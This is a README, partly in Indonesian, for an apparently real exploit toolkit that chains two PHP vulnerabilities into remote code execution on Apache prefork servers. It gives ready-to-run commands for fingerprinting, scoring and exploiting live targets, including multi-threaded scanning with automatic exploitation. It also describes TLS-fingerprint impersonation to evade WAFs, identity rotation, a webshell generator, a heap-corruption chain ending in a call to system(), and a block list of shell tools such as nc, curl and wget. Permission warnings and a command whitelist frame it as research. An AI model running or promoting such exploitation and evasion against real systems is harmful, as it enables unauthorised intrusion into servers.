# 💀 PHP2SHELL — Enhanced Edition (v2.0.0)

### Toolkit riset reproducibility **CVE-2026-109619** / **CVE-2026-109618** · **Full ID + Full EN**

*Pure-HTTP chain · JA3 impersonation · proof-of-access design · **bilingual (Indonesia / English)***

> Repo ini: **[`YogaRmdn/Php2shell`](https://github.com/YogaRmdn/Php2shell)** — rekayasa ulang dari
> [`aarsaputra/php2shell`](https://github.com/aarsaputra/php2shell) dengan arsitektur modular,
> mesin bahasa penuh, dan pagar perintah yang **ditegakkan di kode** (bukan di teks).

> ⚠️ **Gunakan HANYA untuk sistem yang Anda miliki atau punya izin tertulis.**
> Eksploitasi sistem pihak ketiga tanpa izin adalah tindak pidana (UU ITE, CFAA, dsb.).

---

## ❖ Apa gunanya tool ini?

Toolkit **deteksi + reproduksi riset** untuk dua kerentanan PHP yang sudah dipatch.
Intinya: memudahkan peneliti memverifikasi *apakah sebuah build PHP tertentu benar-benar
rentan / berhasil di-exploit / hanya bocor memori*, secara terstruktur dan terdokumentasi.

| Kebutuhan Anda | Mode yang dipakai |
| --- | --- |
| "Apakah target ini rentan?" (baca saja, **tidak menyerang**) | `detect` |
| "Seberapa siap dieksploitasi?" (skor 0–90 + blocker) | `preflight` |
| "Buktikan dampaknya" (rantai penuh 0→RCE, **izin diperlukan**) | `exploit` |
| "Scan banyak URL dari file + laporan" | `scan` |
| "Tabel build mana yang RCE / leak-only / belum terbukti" | `builds` |
| "Info advisori CVE & fix-floor versi" | `advisories` |
| "Generator webshell berpassword untuk lab" (bukan uploader) | `shell` |
| "Cek update tool" | `version` |

Rantai berjalan **HTTP-murni** ke `mod_php + Apache prefork` dengan **nol syarat sisi target**:

- ❌ tanpa `session_start()` di halaman target
- ❌ tanpa fitur upload file
- ❌ tanpa kredensial / cookie / trik header
- ✅ halaman target bisa literal `<?php echo "OK\n"; ?>`

**Desain proof-of-access** (sengaja, bukan kekurangan): perintah dibatasi 14 byte, hanya
perintah identitas (`id`, `whoami`, …), primitif shell (`bash`/`nc`/`curl`) diblokir permanen.
Toolkit ini **membuktikan dampak**, bukan membuat backdoor siap pakai.

---

## ❖ Instalasi

```bash
git clone https://github.com/YogaRmdn/Php2shell.git
cd Php2shell
bash install.sh          # venv + dependensi + smoke test (34 unit test)
```

Manual (tanpa installer) — semua mode jalan dengan **stdlib Python 3.10+**:

```bash
python3 php2shell.py --lang id
```

Dependensi opsional (`requirements.txt`):

- `curl_cffi` — sidik jari TLS/JA3 browser sungguhan (tanpa ini: fallback urllib, mudah terdeteksi WAF)
- `bcrypt` — hash password untuk mode `shell` (tanpa ini: fallback hash native PHP `$2y$`)

---

## ❖ Mode interaktif

Jalankan **tanpa argumen** untuk masuk menu interaktif (pilih bahasa → pilih mode → isi parameter):

```bash
python3 php2shell.py            # menu interaktif
python3 php2shell.py --lang id  # menu interaktif, bahasa Indonesia
```

---

## ❖ Ganti bahasa (fitur utama)

```bash
python3 php2shell.py --lang id            # Bahasa Indonesia
python3 php2shell.py --lang en            # English
P2S_LANG=id python3 php2shell.py          # via environment variable
python3 php2shell.py                      # auto: deteksi dari locale sistem (LC_ALL/LANG)
```

Urutan pemilihan bahasa: `--lang` → `P2S_LANG` → `LC_ALL`/`LC_MESSAGES`/`LANG` → default `en`.

**Menambah bahasa baru:**

1. Salin `lang/en.json` → `lang/<kode>.json` (mis. `lang/ja.json`)
2. Terjemahkan nilai string (kunci tetap sama)
3. Jalankan `python3 php2shell.py --lang ja`

Sudah ada jatuh-aman (*fallback*): kunci yang belum diterjemahkan otomatis memakai bahasa EN.
Test `test_all_keys_parity` memastikan struktur kunci ID & EN selalu identik.

---

## ❖ Panduan pemakaian (semua mode)

### 1. `detect -u URL` — sidik jari (**read-only, tidak menyerang**)

```bash
python3 php2shell.py --lang en detect -u https://target.example/
python3 php2shell.py --lang en detect -u https://t1/ https://t2/ --no-oom
python3 php2shell.py --lang id detect -l targets.txt --json out/r.json --csv out/r.csv
```

Membaca: versi PHP, branch & verdict (vulnerable/patched/EOL), `session.upload_progress`,
`display_errors`, memory_limit. Probe OOM aktif (`--no-oom` untuk mematikan) otomatis
menyala bila verdict masih unknown/eol.

### 2. `preflight -u URL` — skor kesiapan (0–90)

```bash
python3 php2shell.py --lang id preflight -u https://target.example/
```

Skor dari: versi rentan (30), upload_progress On (30), display_errors On (15), versi dikenali (15).
**Deteksi = informasi, bukan gerbang** — versi tersembunyi CDN tetap boleh lanjut.
Blocker keras cuma dua: server mati, atau versi TERBACA sudah patch.

### 3. `scan -l targets.txt` — banyak target sekaligus

```bash
python3 php2shell.py --lang id scan -l targets.txt
python3 php2shell.py --lang id scan -l targets.txt --exploit --yes --threads 10
python3 php2shell.py --lang id scan -l targets.txt --json out/r.json --csv out/r.csv
```

Format file: satu URL/baris, `#` komentar, duplikat dibuang, tanpa `://` otomatis `https://`.
Alur per target: `detect` → `preflight` → (opsional `--exploit`) → laporan.

### 4. `exploit -u URL` — rantai penuh (izin diperlukan)

```bash
# lab lokal (mount /out) → hasil TERBACA:
python3 php2shell.py --lang id exploit -u http://127.0.0.1:8095/index.php \
    --force --yes --exploit-profile bookworm -c 'id' --proof-file p1

# target live → BLIND (perintah jalan, output tak terbaca — by design):
python3 php2shell.py --lang en exploit -u https://target.example/ --yes -c 'id'
```

Flag penting:

| Flag | Fungsi |
| --- | --- |
| `-c, --cmd` | perintah (default `id`, maks 14 byte, whitelist identitas) |
| `--allow-cmd` | tambah perintah whitelist **eksplisit** |
| `--proof-file` | simpan bukti akses ke file |
| `--exploit-profile` | `bookworm` (default) atau `lab` |
| `--force` | lewati penilaian kesiapan (tetap butuh `--yes`) |
| `--yes` | konfirmasi eksekusi (wajib) |
| `--zif-offset` / `--dtor-offset` / `--htdata-offset` | offset simbol manual |
| `--huge-mb` / `--retries` / `--exploit-timeout` | tuning stage-1 & retry |

### 5. `shell` — generator webshell berpassword

```bash
python3 php2shell.py --lang id shell --out shell/out --ttl 72 --commands "id,whoami"
```

Hasil: file PHP (nama 32-hex) + `CREDENTIALS.txt` (bcrypt, plaintext TIDAK disimpan di shell).
Fitur: password bcrypt, whitelist perintah, TTL kedaluwarsa, rate limit.
**Generator saja — tidak meng-upload apa pun ke mana pun.**

### 6. `builds` — tabel dukungan per build

```bash
python3 php2shell.py --lang id builds                 # seluruh tabel
python3 php2shell.py --lang id builds --level rce     # hanya yang RCE terbukti
python3 php2shell.py --lang id builds --level leak    # hanya leak-saja
```

Level: `rce` (stage 1+2+3 terbukti) · `leak` (stage 1+2 saja) · `no` (UAF ada, exploit belum terbukti).

### 7. `advisories` dan `version`

```bash
python3 php2shell.py --lang en advisories
python3 php2shell.py --lang en version             # exit 10 bila ada update (gate CI)
```

---

## ❖ Flag global (berlaku untuk semua mode)

| Flag | Default | Fungsi |
| --- | --- | --- |
| `--lang {en,id}` | auto locale | bahasa antarmuka |
| `--ja3 {chrome,safari,firefox,android,edge}` | `chrome` | profil sidik jari TLS/JA3 |
| `--delay` | `1.0` | jeda antar request (detik) |
| `--timeout` | `15` | timeout HTTP |
| `--proxy` | – | lewatkan trafik ke proxy |
| `--audit FILE` | – | tulis audit log JSONL |
| `--rotate-identity` | off | rotasi identitas request |
| `--json FILE` / `--csv FILE` | – | ekspor hasil |
| `-v, --verbose` | off | detail + traceback |

---

## ❖ Pagar perintah (proof-of-access — TIDAK bisa dimatikan)

Ditegakkan **di kode**, sebelum ada pun I/O jaringan:

| Pagar | Detail |
| --- | --- |
| **Ukuran** | maksimal **14 byte** |
| **Whitelist** | hanya identitas: `id`, `whoami`, `uname`, `hostname`, `pwd`, `date`, `ls`, `df`, `cat`, `uptime`, `arch`, `env`, `free` |
| **Operator shell** | `; & \| > < \` $ ( ) { } * ? ~` dan newline → **ditolak** |
| **Primitif shell** | `bash sh nc python perl ruby curl wget eval base64 sudo rm dd …` → **diblokir permanen** |
| **`--revshell`** | **TIDAK ADA** di parser dan diblokir di level runner |
| **Gate eksekusi** | `exploit` hanya jalan bila READY **DAN** `--yes` |

16 negative test di `tests/test_fence.py` memverifikasi pagar.

---

## ❖ Arsitektur modul

```
Php2shell/
├── php2shell.py        CLI utama (argparse, i18n-aware, mode interaktif)
├── install.sh          pemasang sekali-jalan (venv + deps + smoke test)
├── requirements.txt    dependensi opsional (curl_cffi, bcrypt)
├── lang/
│   ├── en.json         English (bahasa patokan / fallback)
│   └── id.json         Bahasa Indonesia
├── lib/
│   ├── i18n.py         ★ mesin bahasa (fallback berantai, interpolasi, auto-detect)
│   ├── config.py       konstanta, tabel build, pagar perintah (satu sumber kebenaran)
│   ├── banner.py       ASCII art + identitas (ikut --lang)
│   ├── interactive.py  ★ menu berbasis input (dipakai saat tanpa argumen)
│   ├── transport.py    HTTP JA3 (curl_cffi) + rate limit + audit JSONL + fallback urllib
│   ├── detect.py       sidik jari pasif (versi, upload_progress, display_errors)
│   ├── oomprobe.py     ★ probe OOM aktif bertingkat (metodologi assetnote)
│   ├── memprobe.py     baca memory_limit (ukuran field stage-1 otomatis)
│   ├── preflight.py    skor kesiapan 0–90 + blocker keras
│   ├── chain.py        ★ mesin rantai 3 tahap (in-process, pure Python)
│   ├── runner.py       orkestrasi + pagar perintah + bukti otomatis
│   ├── webshell.py     generator webshell berpassword (bcrypt + TTL)
│   ├── scanner.py      pemindai multi-target (thread pool)
│   ├── reporter.py     output JSON / CSV / tabel terminal
│   ├── updater.py      cek versi vs GitHub (gagal-aman, cache 1 jam)
│   └── advisory.py     data advisori CVE
└── tests/              34 unit test (fence, i18n, versi, webshell)
```

---

## ❖ Cara kerja rantai (CVE-2026-109619)

```
┌──────────────┐   ① field multipart raksasa → OOM di dalam
│  REQUEST A   │      php_session_initialize()
│  (producer)  │      → PS(http_session_vars) menggantung
└──────────────┘      → worker prefork mati (SIGABRT)
┌──────────────┐   ② prefork fork worker BARU yang MWARISI
│  REQUEST B   │      mapping libphp & layout heap yang sama
│  (consumer)  │      → reclaim referensi menggantung
└──────────────┘      → leak basis libphp → ASLR kalah
       │
       ▼   ③ HashTable palsu: pDestructor = zif_system
┌──────────────────────────────────────────────┐
│  php_session_track_init()                    │
│    → zval_ptr_dtor(PS(http_session_vars))    │
│      → zend_array_destroy(HT palsu)          │
│        → zend_hash_destroy(HT palsu)         │
│          → pDestructor(&bucket) = SYSTEM()   │
└──────────────────────────────────────────────┘
```

Fix-floor: **8.2.35 / 8.3.36 / 8.4.27 / 8.5.12**
(last vulnerable: 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11)

---

## ❖ Menjalankan test

```bash
python3 -m unittest discover -s tests -t . -v      # 34 test
```

---

## ❖ Troubleshooting

| Gejala | Solusi |
| --- | --- |
| `ModuleNotFoundError: curl_cffi` | `pip install -r requirements.txt` (opsional, tanpa ini tetap jalan) |
| Semua request ditolak WAF/bot | pasang `curl_cffi` + pakai `--ja3 chrome` |
| Probe OOM tidak mau jalan | cek `--no-oom` tidak ter-set; butuh izin write pada target |
| Bahasa selalu EN | cek `--lang id` / `P2S_LANG=id` |
| Exit code `10` dari `version` | tool sudah ada rilis lebih baru (dipakai sebagai gate CI) |

---

## ❖ Kredit & Lisensi

Riset & kode dasar: **Wiz Research** (penemu CVE), **Calif**, **9bie (Qi Deng)** (exploit publik
& heap grooming), **Zer061**, **ikow**, **devploit**, **Assetnote / Searchlight Cyber**
(metodologi deteksi OOM), **PHP Group** (advisori & perbaikan).
Toolkit ini adalah **rekayasa ulang/penyempurnaan** dari [`aarsaputra/php2shell`](https://github.com/aarsaputra/php2shell).

Lisensi: **GPL-3.0-only** — lihat `LICENSE` asli pada repo sumber.
